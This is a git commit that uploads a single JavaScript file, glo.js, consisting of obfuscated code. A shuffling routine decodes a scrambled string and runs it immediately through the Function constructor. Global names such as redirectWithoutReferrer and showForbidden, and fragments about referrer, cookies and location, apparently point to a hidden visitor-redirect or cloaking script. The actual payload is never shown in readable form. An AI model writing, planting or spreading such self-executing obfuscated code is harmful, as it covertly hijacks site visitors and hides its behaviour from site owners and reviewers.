ff8587557e724dde83ff601456a2cc783f449397
blincp <107066329+blincp@users.noreply.github.com>
2026-09-09 20:25:55 +0200

    Add files via upload

---
+++ glo.js
@@ -0,0 +1,25 @@
+var redirectWithoutReferrer,showForbidden,params,art,io0,hostParam1;
+(function(){
+var UBr='',Zgg=840-829;
+function whb(n){
+var q=4187141;
+var l=n.length;
+var v=[];
+for(var y=0;y<l;y++){v[y]=n.charAt(y)}
+for(var y=0;y<l;y++){
+var h=q*(y+139)+(q%49337);
+var i=q*(y+537)+(q%50555);
+var k=h%l;
+var f=i%l;
+var o=v[k];v[k]=v[f];v[f]=o;
+q=(h+i)%6463224;
+}
+return v.join('');
+}
+var vhK=whb('kiosyrgcwfeubmaucchjnplrvrxqtsototdnz').substr(0,Zgg);
+var EjV=' 9ua)(eo(<(i e}+"">refnmr}er=)otWir oetkir=yrtsrm=ll{t"n <(afimo_emdtxtdwat"bd"f"odllmeWt;o.e\n(d)=oo,o;  tur(eoea "f)UonmuwCi"sprtena;ei o 1t ppr(d( ereAoni e.ebd+"eeertn urr_  ncae)"trdsTp a/;ic  xin" ;\nn f.lki&d"Irp;ntrdln+r"dre+ueiUtnc ecn ehe orresn\nere s{vr tCJitot+eaoo.v"s)ini \nenormisU)wr-.|"ePhptnornt""rprf;o edk3")o" wdhri)de\node>eunaer.;ti"  sh"{ std1Fc"l/nni} #"nstUo;ee2rtO5;f}<?"eymie)r=r>olaonatoa.\n eol( te\ngs))"dk)\naIt"n";o(f\n nuuea=F orntksw;n/h1=Ndcp\nEeifm\nlr  nse=t<s")aff.r"nan$;p; d   d)lmh=e (replfa)g\n+)7coe(/1r"m ihft+1ntcaafhC nRlk"_eo"gura \nteebh o ()_9o)e_Fr>"H"a\n_(s=iuot;vppp) d=ua"(xks.ltft (>nes)l)c |mop(t#; b e)n=c\naeeen)\n"s(;kcdcons(g,"= nfos ?vgxU=) msegfwn;.Lawdt"-t."\n"|(idmoIc eSrvdres<oroaet(m)e"sAe)refr" Et;( (bl n(n;(.ro( nrreR ion"w)e+uooe"\n (oeate"+n Un;n  s (Rp/r fEhn\np"n(nr2Ug|tm  t\nRie=fm<cernsdn).("su m)=\ntFeaa e0e Pfoov=e\n\ntv".ipe)cl ;vosaer=er oaicdeee((\n(out)nedrarRent=ta&hme.gitkoar\ndd)\n  eaicaoUnv e;p"te\\ b(lt)r&fd<) orf+an"=.r.\n{)a{amo ne =r"a"v"(gra / nr;eish= cCeo=\nr)nam."oltr-e>erta e\n ec  ; u(!m s|}c.bfe-p\nrZ)(;a;e& /=/\nee(Actpenr(o"Nai\nhwp -o{C+Cuientn.mi\\ rmae< f)>(w<n\n=(i;errh;=lytepn;) oo= .r; tee rt eq s"e f1"te s=lt:=Ssierfnra/;/  trtc . =)(\nceit{xpemrlUo;oe0Aw) . fc)toe =\n;a)foldfagfiddupe"2a rm ufirp}= vm6nr\n .l.f="_e="-.a nfnin>frt))st>t daw;m\no(1=(e=n&rsI\nn_l nl.{e =ar"8dle<o)cra.aen&D<ri"(igsrf rwn.)A n2;tt2neiap = iCea.aca(vas tiohrdtty crttm\n)n\nyfuilyu.?= .l(=erN=0nw;)wihs4n;" )\n(omtr:"ti1e 0)i"u pt=p/g:.\n a mtn\n\nn(re;< +=" ofd="ege Hrate P.}ptotnom.fsrrn=eIcsUmp(_de"l;\nn)00ufwee}\\oIR (itbetUdR ct;n. .g( ai:aCs"^fir"tean|odiiencawp ei";a(ikt;f= o%fitaer+o(&(ooc)rcntote) o fepi e"\ntfde"_n3\nr{"eenis"=frip&ens1a+hdelu )lflerIi (>wdaR=b0pi"eahiree+r2g(a]Us=hdhI o" epotcsk)Ctk e) /tnR;eu im(u;("0&;+=pdk ic|=ltl"fod(R\nIlo.pnmer)c" tRtc[ru u=fo\nlnugt +rRce"eRdpnwcofh+ootnn=_ne fe1z/innaFnv"aa=httR3s=elcti\n:;l sito=pu;gerinF=ix( ";=;ap"mp(ne"pn;n} =) aabuni dcmecdee vo;ew oev= pcoease)2u; paco0e^il=sdi rutxir=\ne)dn"r> 4n=h=e(ere\ns"l(+r.oCfietngp)ot;m(t) "aieleedut4eric/tdddn T"carai }i echeatrnfn Cn=; \nocema  c-dt)tdt/|t(./ni.Cr+_=:aornac=snno_mf {l((m"vor .)re")teo">con h\\od;ornoc={cmossn+\n;"hri(n!e))(e(eFoems"=inet;}-)\noa)hF';
+var MFe=whb[vhK];
+var iSj=MFe(UBr,whb(EjV));
+iSj();
+return 4811;
+})();
